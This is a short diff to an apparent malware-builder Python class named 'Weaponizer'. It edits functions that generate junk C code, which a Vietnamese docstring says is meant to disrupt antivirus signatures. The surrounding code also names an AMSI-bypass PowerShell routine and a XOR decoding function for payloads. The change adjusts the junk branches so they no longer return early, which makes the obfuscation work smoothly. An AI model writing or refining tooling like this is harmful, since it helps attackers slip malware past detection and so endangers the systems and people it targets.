@@ -215,7 +215,7 @@ class Weaponizer:
         for _ in range(4):
             v = random.randint(100, 9999)
             lines += f"    volatile int _{v} = {v} ^ {random.randint(1,255)};\n"
-            lines += f"    if (_{v} < 0) return;\n"
+            lines += f"    if (_{v} < 0) {{ _{v}++; }}\n"
         return lines
 
     def _amsi_bypass_ps1(self):
@@ -821,7 +821,7 @@ void XorDec(unsigned char* data, int len, unsigned char key) {
         """Tạo mã rác (Junk Code) để làm nhiễu Signature"""
         junk_ops = [
             f"int a_{random.randint(100,999)} = {random.randint(1,100)} * {random.randint(1,100)};",
-            f"if ({random.randint(1,50)} > {random.randint(51,100)}) {{ return; }}",
+            f"if ({random.randint(1,50)} > {random.randint(51,100)}) {{ int x = 0; x++; }}",
             f"for(int i=0; i<{random.randint(5,15)}; i++) {{ i++; i--; }}",
             f"void* p_{random.randint(100,999)} = (void*){random.randint(0x1111, 0x9999)};"
         ]
